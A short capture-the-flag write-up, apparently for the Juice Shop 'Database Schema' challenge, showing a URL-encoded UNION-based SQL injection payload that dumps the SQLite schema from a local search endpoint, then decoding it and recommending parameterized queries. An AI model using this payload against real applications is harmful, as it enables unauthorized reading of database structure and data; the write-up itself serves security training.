Challenge: Database Schema
Objective
Exfiltrate the entire DB schema definition via SQL Injection.

Solution
Send GET request to search endpoint >> `http://localhost:3000/rest/products/search?q=juice%25%27+AND+1%3C%3E1%29%29+UNION+ALL+SELECT+type%2C+name%2C+tbl_name%2C+rootpage%2C+sql%2C+7%2C+8%2C+9+%2C+10+FROM+sqlite_master--` >> Observe JSON response containing `sqlite_master` table structure >> SOLVED :)

Relevant Concepts
SQL Injection (SQLi)
Database Schema Exfiltration
UNION-Based SQLi

Lessons Learned
Applications must never concatenate user input directly into SQL queries. Input parameters must be sanitized and bound using parameterized queries (prepared statements) to prevent attackers from injecting arbitrary SQL logic and reading database system metadata.

SQL Injection & Schema Insights:
What sqlite_master Is: `sqlite_master` is a built-in system table in SQLite databases that stores the complete schema definition, including all table names, column structures, and index definitions (`sql` field).
How Interpreting It Enabled the Solution: The URL targets the search endpoint (`/rest/products/search?q=...`) with a URL-encoded SQL injection payload. Decoding the payload reveals: `juice%' AND 1<>1)) UNION ALL SELECT type, name, tbl_name, rootpage, sql, 7, 8, 9, 10 FROM sqlite_master--`. This breaks out of the product search query, forces the primary query to return zero rows (`AND 1<>1`), and appends the complete database structure from `sqlite_master` into the API JSON response.
